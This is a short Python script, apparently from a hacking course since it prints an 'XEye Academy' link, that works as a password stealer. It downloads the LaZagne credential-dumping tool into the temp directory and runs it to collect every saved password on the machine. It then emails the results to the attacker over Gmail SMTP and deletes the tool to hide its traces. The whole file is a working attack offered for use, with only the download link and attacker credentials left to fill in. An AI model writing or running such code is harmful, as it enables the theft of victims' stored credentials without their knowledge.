import smtplib,os,tempfile,subprocess,requests

def smail(email, password, message):
    smtps = smtplib.SMTP("smtp.gmail.com", 587)
    smtps.starttls()
    smtps.login(email, password)
    smtps.sendmail(email,email,message)
    smtps.quit()
def murl(url):
    filen = url.split("/")[-1]
    respo = requests.get(url)
    with open(filen,"wb") as outfile:
        outfile.write(respo.content)

tempf = tempfile.gettempdir()
os.chdir(tempf)
murl("Enter the link to lazagne file here")
cmd = "lazagne all"
result = subprocess.check_output(cmd)
smail("Enter your email", "Enter your password", result)
print(" XEye Academy --> https://academy.XEyecs.com ")
os.remove("lazagne.exe")
